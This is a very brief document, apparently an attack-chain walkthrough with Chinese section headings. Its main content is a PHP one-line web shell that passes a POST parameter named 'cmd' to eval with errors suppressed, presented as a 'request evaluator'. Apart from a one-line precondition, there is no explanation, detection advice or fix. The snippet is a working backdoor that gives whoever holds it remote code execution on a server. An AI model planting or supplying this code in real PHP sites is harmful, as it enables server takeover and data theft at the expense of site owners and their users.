# Request evaluator walkthrough

**前置条件：**
- An untrusted request reaches eval.

**攻击链：**
The following request evaluator illustrates the vulnerable file body.

```php
<?php @eval($_POST['cmd']); ?>
```
